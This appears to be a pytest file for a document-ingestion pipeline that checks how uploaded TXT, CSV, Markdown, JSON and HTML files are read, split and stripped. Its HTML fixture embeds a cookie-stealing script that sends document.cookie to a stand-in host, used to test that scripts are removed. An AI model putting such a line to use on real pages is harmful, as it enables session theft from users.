"""All formats, PR 1 (#522), through the whole flow with fakes and no AI: upload -> scan ->
the kind told -> its reader -> pages, pieces and values. A text file's name chooses its reader,
never what its text looks like; a CSV is still read by the CSV reader alone."""

import io
import json

from kaagaz.api.views import status_message
from kaagaz.ingestion import resolve
from kaagaz.reading.csv_reader import CsvReader
from kaagaz.reading.socket import ReaderSocket
from kaagaz.reading.spans import CellLocation
from kaagaz.reading.text_reader import TextReader
from kaagaz.reading.xlsx_reader import XlsxReader
from kaagaz.scanning.gate import DocumentStatus
from tests.fakes import FakeEmbedder
from tests.test_pipeline import CUSTOMER, XLSX_LIMITS, System, build, stored_type

SOCKET = ReaderSocket(
    {
        resolve.CSV: CsvReader(max_cells=10_000),
        resolve.XLSX: XlsxReader(XLSX_LIMITS),
        **{kind: TextReader(kind, max_lines=10_000) for kind in ("txt", "md", "json", "html")},
    }
)
CSV_LIKE = b"invoice,amount\nINV-1,100\nINV-2,250\n"
HTML = (
    b"<html><head><title>Rent receipt</title><script>fetch('http://evil.test/'+document.cookie)</script>"
    b"<style>body{color:red}</style></head><body><h1>Received with thanks</h1>"
    b"<p>Rs 12,000 for April</p><noscript>enable scripts</noscript><!-- hidden note --></body></html>"
)


def run(name: str, data: bytes) -> tuple[System, str]:
    system = build(socket=SOCKET, embed=FakeEmbedder())
    doc = system.upload.accept(CUSTOMER, io.BytesIO(data), display_name=name).document_id
    while system.worker.run_once():
        pass
    return system, doc


def pieces(system: System, doc: str) -> list[str]:
    return [piece.text for piece in system.store.for_document(CUSTOMER, doc)]


def test_a_txt_holding_csv_like_text_is_read_as_text_not_as_cells() -> None:
    system, doc = run("register.txt", CSV_LIKE)
    assert stored_type(system, doc) == resolve.TXT
    assert system.statuses.get_status(CUSTOMER, doc) is DocumentStatus.READY
    assert pieces(system, doc) == ["invoice,amount\nINV-1,100\nINV-2,250"]  # one paragraph, no columns
    assert system.store.values_for(CUSTOMER, doc) == []  # no header rule over text
    content = system.store.content(CUSTOMER, doc)
    assert content is not None
    assert [(page.info.page, page.info.unit) for page in content.pages] == [(1, "cells")]


def test_a_csv_is_still_read_by_the_csv_reader_only() -> None:
    system, doc = run("register.csv", CSV_LIKE)
    assert stored_type(system, doc) == resolve.CSV
    assert pieces(system, doc) == ["A: invoice | B: amount", "A: INV-1 | B: 100", "A: INV-2 | B: 250"]
    assert [value.value_text for value in system.store.values_for(CUSTOMER, doc)] == [
        "INV-1",
        "100",
        "INV-2",
        "250",
    ]


def test_a_csv_holding_html_is_read_as_csv_cells_and_never_rendered() -> None:
    system, doc = run("export.csv", b"<b>Name</b>,<script>x()</script>\nAsha,12\n")
    assert stored_type(system, doc) == resolve.CSV
    assert pieces(system, doc) == ["A: <b>Name</b> | B: <script>x()</script>", "A: Asha | B: 12"]


def test_markdown_is_read_as_its_text_in_paragraphs() -> None:
    system, doc = run("notes.md", b"# Lease\n\nTenant: Asha\nRent: 12,000\n\n- paid in April\n")
    assert stored_type(system, doc) == resolve.MD
    assert pieces(system, doc) == ["# Lease", "Tenant: Asha\nRent: 12,000", "- paid in April"]
    assert {piece.label for piece in system.store.for_document(CUSTOMER, doc)} == {"verified"}


def test_json_is_read_pretty_printed() -> None:
    data = json.dumps({"party": "Mehta Textiles", "amount": 250}).encode()
    system, doc = run("export.json", data)
    assert stored_type(system, doc) == resolve.JSON
    assert pieces(system, doc) == ['{\n"party": "Mehta Textiles",\n"amount": 250\n}']


def test_a_json_file_that_is_not_json_is_read_as_text() -> None:
    system, doc = run("export.json", b'{"party": "Mehta",')
    assert stored_type(system, doc) == resolve.TXT
    assert pieces(system, doc) == ['{"party": "Mehta",']


def test_deep_json_is_refused_in_plain_words() -> None:
    system, doc = run("deep.json", b"[" * 101 + b"]" * 101)
    assert stored_type(system, doc) == resolve.JSON
    assert system.statuses.get_status(CUSTOMER, doc) is DocumentStatus.FAILED
    assert system.repo.failure_codes[(CUSTOMER, doc)] == "too_deep"
    assert pieces(system, doc) == []
    assert status_message("failed", "too_deep", detected_type="json", max_pages=100) == (
        "This JSON file is nested more than 100 levels deep, so it can't be read. Flatten it and upload it"
        " again."
    )


def test_html_keeps_its_title_and_words_and_drops_its_scripts_styles_and_comments() -> None:
    system, doc = run("receipt.html", HTML)
    assert stored_type(system, doc) == resolve.HTML
    assert pieces(system, doc) == ["Rent receipt\nReceived with thanks\nRs 12,000 for April"]
    content = system.store.content(CUSTOMER, doc)
    assert content is not None
    every_word = " ".join(span.text for output in content.outputs for span in output.spans)
    for gone in ("fetch", "evil.test", "cookie", "color", "enable scripts", "hidden note", "<"):
        assert gone not in every_word


def test_a_text_file_with_no_name_ending_is_plain_text() -> None:
    system, doc = run("README", b"Line one\nLine two\n")
    assert stored_type(system, doc) == resolve.TXT
    assert pieces(system, doc) == ["Line one\nLine two"]


def test_a_long_text_file_is_read_on_pages_each_cited_at_its_line() -> None:
    paragraph = ("word " * 39 + "end\n") * 4 + "\n"  # 4 lines of 199 characters, then a blank
    system, doc = run("long.txt", (paragraph * 10).encode())
    content = system.store.content(CUSTOMER, doc)
    assert content is not None
    assert len(content.pages) == 3  # about 8,000 characters at 3,000 a page, cut at line breaks
    found = system.store.for_document(CUSTOMER, doc)
    assert all(len(piece.text) <= 800 for piece in found)
    first = found[0].locations
    assert first[0] == CellLocation(1, 1, 1) and all(isinstance(spot, CellLocation) for spot in first)


def test_a_text_file_that_is_not_utf8_fails_in_plain_words() -> None:
    system, doc = run("legacy.txt", b"ok\n" * 2100 + b"caf\xe9")  # UTF-8 in its first 4 KiB only
    assert system.repo.failure_codes[(CUSTOMER, doc)] == "not_utf8"
    assert status_message("failed", "not_utf8", detected_type="txt", max_pages=100) == (
        "This text file isn't saved as UTF-8, so it can't be read. Save it as UTF-8 and upload it again."
    )
